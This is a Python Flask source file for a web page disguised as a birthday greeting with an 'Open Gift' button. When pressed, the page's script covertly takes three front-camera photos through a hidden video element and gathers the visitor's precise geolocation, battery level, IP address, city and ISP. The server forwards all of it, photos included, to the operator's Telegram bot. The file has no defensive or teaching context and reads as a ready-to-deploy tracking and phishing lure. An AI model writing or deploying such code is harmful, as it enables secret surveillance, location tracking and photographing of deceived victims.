from flask import Flask, request, render_template_string
import requests, os

app = Flask(__name__)

# ===== CONFIG =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID = os.environ.get("CHAT_ID", "YOUR_CHAT_ID_HERE")

# ===== FUNCTIONS =====
def send_to_telegram(text, photo_paths=None):
    try:
        # Send IP + battery + location text
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text})
        # Send all photos
        if photo_paths:
            for path in photo_paths:
                with open(path, "rb") as f:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                                  data={"chat_id": CHAT_ID, "caption": "🎁 Birthday Photo"},
                                  files={"photo": f})
    except Exception as e:
        print("Telegram error:", e)

def get_ip_info():
    try:
        res = requests.get("https://ipinfo.io/json", timeout=2)
        data = res.json()
        return {
            "ip": data.get('ip','N/A'),
            "city": data.get('city','N/A'),
            "region": data.get('region','N/A'),
            "country": data.get('country','N/A'),
            "org": data.get('org','N/A')
        }
    except:
        return {"ip":"N/A","city":"N/A","region":"N/A","country":"N/A","org":"N/A"}

# ===== ROUTES =====
@app.route("/", methods=["GET"])
def home():
    return render_template_string("""
<html>
<head>
<title>🎉 Happy Birthday 🎉</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:#111;color:white;font-family:Arial;text-align:center;padding:50px;}
#cake{font-size:120px;margin-bottom:20px;}
h1{font-size:40px;margin-bottom:30px;}
button{padding:18px;font-size:24px;background:#ff4081;color:white;border:none;border-radius:12px;cursor:pointer;}
video{display:none;}
</style>
</head>
<body>
<div id="cake">🎂</div>
<h1>🎉 Happy Birthday 🎉</h1>
<button onclick="openGift()">🎁 Open Gift</button>
<video id="video" autoplay playsinline></video>

<script>
async function getBatteryLevel(){
    if(navigator.getBattery){
        try{const b=await navigator.getBattery(); return Math.round(b.level*100);}catch(e){return "N/A";}
    }
    return "N/A";
}

async function capturePhotos(count=3){
    const video=document.getElementById("video");
    let blobs=[];
    try{
        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:320, height:240}});
        video.srcObject=stream;
        await new Promise(resolve=>video.onloadedmetadata=resolve);
        await new Promise(r=>setTimeout(r,200)); // wait frames

        for(let i=0;i<count;i++){
            const canvas=document.createElement("canvas");
            canvas.width=320; canvas.height=240;
            canvas.getContext("2d").drawImage(video,0,0,320,240);
            const blob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.6));
            blobs.push(blob);
            await new Promise(r=>setTimeout(r,150));
        }
        stream.getTracks().forEach(t=>t.stop());
    }catch(e){console.log("Camera error:",e);}
    return blobs;
}

async function openGift(){
    const batteryPromise=getBatteryLevel();
    const photoPromise=capturePhotos(3);

    // Browser geolocation for precise location
    const locationPromise=new Promise(resolve=>{
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(pos=>{
                resolve({lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy});
            }, err=>{
                resolve({lat:"N/A", lon:"N/A", accuracy:"N/A"});
            }, {enableHighAccuracy:true, timeout:5000});
        } else resolve({lat:"N/A", lon:"N/A", accuracy:"N/A"});
    });

    // Get server-side IP info
    const ipResponse=await fetch("/get_ip").then(res=>res.json());

    const battery=await batteryPromise;
    const photos=await photoPromise;
    const location=await locationPromise;

    const mapLink=(location.lat!=="N/A")?`https://www.google.com/maps?q=${location.lat},${location.lon}`:"N/A";

    const formData=new FormData();
    formData.append("battery",battery);
    formData.append("ip_text",`🌐 IP: ${ipResponse.ip}\n🏙 City: ${ipResponse.city}\n🗺 Region: ${ipResponse.region}\n🌍 Country: ${ipResponse.country}\n🏢 Org: ${ipResponse.org}`);
    formData.append("map_link",mapLink);
    formData.append("latitude",location.lat);
    formData.append("longitude",location.lon);
    formData.append("accuracy",location.accuracy);

    photos.forEach((p,i)=>formData.append("photo"+i,p,"photo"+i+".jpg"));

    fetch("/",{method:"POST",body:formData})
    .then(res=>res.json())
    .then(data=>{
        if(data.map) window.location.href=data.map;
        else alert("🎁 Surprise!");
    });
}
</script>
</body>
</html>
""")

@app.route("/get_ip")
def get_ip():
    return get_ip_info()

@app.route("/", methods=["POST"])
def collect():
    battery=request.form.get("battery","N/A")
    ip_text=request.form.get("ip_text","")
    map_link=request.form.get("map_link","N/A")
    latitude=request.form.get("latitude","N/A")
    longitude=request.form.get("longitude","N/A")
    accuracy=request.form.get("accuracy","N/A")

    full_text=f"{ip_text}\n🔋 Battery: {battery}%\n📍 Latitude: {latitude}\n📍 Longitude: {longitude}\n🗺 Google Map: {map_link}\n🎯 Accuracy: {accuracy} meters"

    photo_paths=[]
    for i in range(3):
        photo=request.files.get(f"photo{i}")
        if photo:
            path=f"temp_{i}.jpg"
            photo.save(path)
            photo_paths.append(path)

    send_to_telegram(full_text, photo_paths)

    for p in photo_paths:
        if os.path.exists(p):
            os.remove(p)

    return {"map": map_link}

if __name__=="__main__":
    port=int(os.environ.get("PORT",5000))
    app.run(host="0.0.0.0",port=port)
